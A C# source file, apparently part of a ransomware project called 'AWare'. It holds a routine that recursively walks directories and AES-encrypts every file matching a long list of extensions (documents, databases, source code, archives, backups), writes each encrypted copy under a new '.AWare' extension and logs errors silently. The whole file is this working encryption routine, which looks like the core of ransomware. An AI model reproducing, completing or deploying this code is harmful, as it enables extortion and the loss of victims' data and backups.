using AWare.Services;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace AWare.Extensions
{
    internal static class StringExtensions
    {

        private static readonly string[] Extensions = new string[]
        {
            ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".pdf",".java",".c",".cpp",".py", ".jpg", ".jpge", ".go", ".rar", ".zip", ".config", ".pdb", ".backup", ".cfg"
        };

        internal static void EncryptDirectories(this string Paths, AesServices _aesServices, string SecretKey)
        {

            try
            {
                string[] Files = Directory.GetFiles(Paths);
                string[] ChildDirectories = Directory.GetDirectories(Paths);

                foreach (var i in Files)
                {
                    
                    var fileInfo = new FileInfo(i);

                    if (Path.GetExtension(i).Contains("AWare"))
                    {
                        Program.ProtectedFiles.Add(fileInfo.FullName);
                        continue;
                    }
                    else if (!Extensions.Contains(Path.GetExtension(i)))
                        continue;                    

                    Program.ProtectedFiles.Add(_aesServices.EncryptFile(i, $"{fileInfo.FullName}.AWare", SecretKey, 10));
                }

                foreach (var Directories in ChildDirectories)
                {
                    Directories.EncryptDirectories(_aesServices, SecretKey);
                }
            }
            catch (Exception ex)
            {
                File.AppendAllText("Error_Log.AWare", ex.Message + Environment.NewLine);
            }
        }
    }
}
